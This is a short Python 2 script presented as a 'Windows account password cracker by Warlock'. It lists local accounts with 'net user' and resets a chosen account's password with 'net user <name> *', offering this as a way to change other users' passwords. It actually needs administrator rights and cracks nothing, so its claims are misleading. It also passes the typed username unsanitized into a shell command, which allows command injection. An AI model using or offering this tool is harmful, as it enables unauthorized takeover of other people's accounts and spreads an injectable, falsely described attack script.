import subprocess
import os
import cmd
import time
import sys

print "\n\t\t#################################################"
print "\t\t#                                               #"
print "\t\t#        WINDOWS ACCOUNT PASSWORD CRACKER       #"
print "\t\t#                   BY WARLOCK                  #"
print "\t\t#                                               #"
print "\t\t#################################################"
print"\n[+]LET's CHACNGE PASSWORD OF OTHER ACCOUNTS ON THIS COMPUTER"
print"\n[+]LET ME FIND ALL USERS ACCOUNTS OF THIS COMPUTER"

time.sleep(5)

try:
    
    from subprocess import check_output
    a=check_output("net user", shell=True)
    print a


    i=raw_input("[+]PLEASE ENTER THE USERNAME OF ACCOUNT THAT YOU WANT TO CHANGE PASSWORD OF :")
    print "\n\n\t\t[+]PLEASE PRESS ENTER TWO TIMES\n\n"

    b='net user'+' '+i+' '+'*'

    from subprocess import check_output
    b=check_output(b, shell=True)

    print"\n[+]THE ACCOUNT YOU ENTERED IS UNLOCKED...PLEASE LOG OFF AND CHECK IT"

    raw_input("\n[+]PRESS ANY TO EXIT")


except:
    print"\n\t\t[+]UNKNOWN ERROR !!!"
    sys.exit(10)
